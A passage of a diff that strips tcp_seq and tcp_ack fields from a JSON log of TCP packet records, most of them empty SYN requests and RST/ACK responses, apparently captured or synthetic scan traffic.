     "timestamp": "2026-07-08T10:08:01.100",
@@ -4510,9 +3910,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 886095107,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:01.150",
@@ -4525,9 +3923,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 153996661,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:01.200",
@@ -4540,9 +3936,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 637586821,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:01.250",
@@ -4555,9 +3949,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 193704673,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:01.300",
@@ -4570,9 +3962,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 748100691,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:01.350",
@@ -4585,9 +3975,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 296094016,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:01.400",
@@ -4600,9 +3988,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 657002836,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:01.450",
@@ -4615,9 +4001,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 357473018,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:01.500",
@@ -4630,9 +4014,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 852847225,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:01.550",
@@ -4645,9 +4027,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 151434409,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:01.600",
@@ -4660,9 +4040,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 741814457,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.000",
@@ -4675,9 +4053,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 220042870,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.030",
@@ -4690,9 +4066,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 388926845,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.060",
@@ -4705,9 +4079,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 341526103,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.090",
@@ -4720,9 +4092,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 66879350,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.120",
@@ -4735,9 +4105,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 389668012,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.150",
@@ -4750,9 +4118,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 90004971,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.180",
@@ -4765,9 +4131,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 88933552,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.210",
@@ -4780,9 +4144,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 318667846,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.240",
@@ -4795,9 +4157,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 147956318,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.270",
@@ -4810,9 +4170,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 173782214,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.300",
@@ -4825,9 +4183,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 13325255,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.330",
@@ -4840,9 +4196,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 90171580,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.360",
@@ -4855,9 +4209,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 103843541,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.390",
@@ -4870,9 +4222,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 200534261,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.420",
@@ -4885,9 +4235,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 326876151,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.450",
@@ -4900,9 +4248,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 285214084,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.480",
@@ -4915,9 +4261,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 102813575,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.510",
@@ -4930,9 +4274,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 222473209,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.540",
@@ -4945,9 +4287,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 261754960,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.570",
@@ -4960,9 +4300,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 33602551,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.600",
@@ -4975,9 +4313,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 103261482,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.630",
@@ -4990,9 +4326,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 238620913,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.660",
@@ -5005,9 +4339,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 183592067,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.690",
@@ -5020,9 +4352,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 349025129,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.720",
@@ -5035,9 +4365,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 117088975,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.750",
@@ -5050,9 +4378,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 317226845,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.780",
@@ -5065,9 +4391,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 238072087,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.810",
@@ -5080,9 +4404,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 285537892,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.840",
@@ -5095,9 +4417,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 377664882,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.870",
@@ -5110,9 +4430,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 319348295,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.900",
@@ -5125,9 +4443,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 161253416,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.930",
@@ -5140,9 +4456,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 160084798,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.960",
@@ -5155,9 +4469,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 204335431,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:00.990",
@@ -5170,9 +4482,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 365594359,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.020",
@@ -5185,9 +4495,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 78371117,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.050",
@@ -5200,9 +4508,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 323591748,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.080",
@@ -5215,9 +4521,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 273042067,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.110",
@@ -5230,9 +4534,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 17377912,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.140",
@@ -5245,9 +4547,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 181925189,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.170",
@@ -5260,9 +4560,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 339587968,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.200",
@@ -5275,9 +4573,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 58871522,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.230",
@@ -5290,9 +4586,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 206273626,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.260",
@@ -5305,9 +4599,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 135643534,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.290",
@@ -5320,9 +4612,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 261599686,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.320",
@@ -5335,9 +4625,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 88438280,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.350",
@@ -5350,9 +4638,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 273183659,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.380",
@@ -5365,9 +4651,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 242949782,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.410",
@@ -5380,9 +4664,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 126188067,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.440",
@@ -5395,9 +4677,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 256818322,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.470",
@@ -5410,9 +4690,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 257682911,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.500",
@@ -5425,9 +4703,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 300248860,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.530",
@@ -5440,9 +4716,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 175983491,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.560",
@@ -5455,9 +4729,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 384826437,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.590",
@@ -5470,9 +4742,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 384490367,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.620",
@@ -5485,9 +4755,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 303923342,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.650",
@@ -5500,9 +4768,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 280891070,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.680",
@@ -5515,9 +4781,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 143782149,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.710",
@@ -5530,9 +4794,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 115256295,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.740",
@@ -5545,9 +4807,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 372945957,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.770",
@@ -5560,9 +4820,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 393500676,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.800",
@@ -5575,9 +4833,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 184605376,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.830",
@@ -5590,9 +4846,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 14486272,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.860",
@@ -5605,9 +4859,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 118517888,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.890",
@@ -5620,9 +4872,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 38771388,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.920",
@@ -5635,9 +4885,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 158268431,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.950",
@@ -5650,9 +4898,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 274243682,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:01.980",
@@ -5665,9 +4911,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 327843132,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.010",
@@ -5680,9 +4924,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 313230676,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.040",
@@ -5695,9 +4937,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 77699751,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.070",
@@ -5710,9 +4950,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 198817706,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.100",
@@ -5725,9 +4963,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 153753328,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.130",
@@ -5740,9 +4976,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 327136235,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.160",
@@ -5755,9 +4989,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 94279647,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.190",
@@ -5770,9 +5002,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 137687105,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.220",
@@ -5785,9 +5015,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 28108427,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.250",
@@ -5800,9 +5028,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 59564704,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.280",
@@ -5815,9 +5041,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 223158186,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.310",
@@ -5830,9 +5054,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 46853240,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.340",
@@ -5845,9 +5067,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 13113466,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.370",
@@ -5860,9 +5080,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 141763580,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.400",
@@ -5875,9 +5093,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 351453977,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.430",
@@ -5890,9 +5106,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 83929728,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.460",
@@ -5905,9 +5119,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 362455151,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.490",
@@ -5920,9 +5132,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 376360312,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.520",
@@ -5935,9 +5145,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 94101311,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.550",
@@ -5950,9 +5158,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 398634081,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.580",
@@ -5965,9 +5171,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 138640867,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.610",
@@ -5980,9 +5184,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 389189736,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.640",
@@ -5995,9 +5197,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 348563944,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.670",
@@ -6010,9 +5210,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 171710713,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.700",
@@ -6025,9 +5223,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 344700761,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.730",
@@ -6040,9 +5236,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 163231098,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.760",
@@ -6055,9 +5249,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 44582739,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.790",
@@ -6070,9 +5262,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 259951633,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.820",
@@ -6085,9 +5275,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 352358970,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.850",
@@ -6100,9 +5288,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 223615882,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.880",
@@ -6115,9 +5301,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 25490641,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.910",
@@ -6130,9 +5314,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 92638533,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.940",
@@ -6145,9 +5327,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 26490559,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:02.970",
@@ -6160,9 +5340,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 77766791,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:03.000",
@@ -6175,9 +5353,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 346200642,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:03.030",
@@ -6190,9 +5366,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 30722841,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:03.060",
@@ -6205,9 +5379,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 303881793,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:03.090",
@@ -6220,9 +5392,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 200946044,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:03.120",
@@ -6235,9 +5405,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 218042777,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:03.150",
@@ -6250,9 +5418,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 350068593,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:03.180",
@@ -6265,9 +5431,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 155035211,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:03.210",
@@ -6280,9 +5444,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 13395769,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
